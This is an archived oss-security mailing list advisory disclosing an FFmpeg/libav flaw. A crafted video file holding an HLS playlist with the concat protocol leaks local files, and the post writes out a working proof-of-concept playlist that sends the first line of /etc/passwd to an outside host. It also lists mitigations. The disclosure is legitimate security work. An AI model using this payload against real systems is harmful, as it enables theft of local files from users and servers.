  oss-security - Fwd: FFmpeg: stealing local files with HLS+concat            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Wed, 13 Jan From: Vladimir Dubrovin <vlad@...urityvulns.ru> To: oss-security@...ts.openwall.com Subject: Fwd: FFmpeg: stealing local files with HLS+concat   ---------- Forwarded message ---------- From: Максим Андреев <andreevmaxim@...il.com> Date: 13 January at Subject: FFmpeg: stealing local files with HLS+concat To: oss-security@...ts.openwall.com   Hello! I found some strange behavior in ffmpeg which can lead to stealing local files during ffmpeg/ffprobe exec, it's also applied to libav.  I've underestimated the impact of this bug, so it was full disclosured in this article (Russian language, but google translate works fine with it) -   In short: if linux user download specially prepared video file (with any extension: avi/mov/etc..) which contains HLS m3u8 playlist with "concat" protocol in url:, #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 concat:http://dx.su/header.m3u8|file:///etc/passwd #EXT-X-ENDLIST  header.m3u8: #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:, http://example.org?  If user launches ffmpeg-based video player (MPlayer, etc..), first line of /etc/passwd will be sent to http://example.org? in http://example.org?# $FreeBSD:  request. The same happens when file manager tries to generate thumbnail for this file.  All this can be applied to server-run ffmpeg during video conversion. FFmpeg/libav security teams are already notified, but official patches are not available yet, so you can rebuild ffmpeg with --disable-network configure option which prevents this vulnerability from being exploited.  Moreover, it's always recommended to run ffmpeg in isolated environment when processing untrusted files  --  Maxim Andreev     Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      